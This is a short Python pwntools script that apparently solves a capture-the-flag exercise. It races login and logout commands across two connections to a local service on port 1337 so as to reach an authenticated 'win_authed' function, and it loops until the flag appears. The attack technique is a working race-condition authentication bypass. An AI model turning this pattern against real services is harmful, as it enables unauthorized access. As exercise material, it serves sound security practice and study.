from pwn import *
while True:
    p1 = connect("127.0.0.1", 1337)
    p2 = connect("127.0.0.1", 1337)
    p1.recvuntil("Function (login/logout/win_authed/quit):")
    p1.sendline("login")
    # p1.sendline("AAAAAAA")
    
    p1.recvuntil("Function (login/logout/win_authed/quit):")
    p1.sendline("logout")
    # p2.recvuntil("Function (login/logout/win_authed/quit):")
    p2.sendline("logout")
    # p1.sendline("AAAAAAA")
    # p2.sendline("AAAAAAA")
    p1.recvuntil("Function (login/logout/win_authed/quit):")
    p1.sendline("win_authed")
    a = p1.recvall(timeout=1)
    p1.close()
    p2.close()
    if a.find(b"flag") != -1:
        print(a)
        break
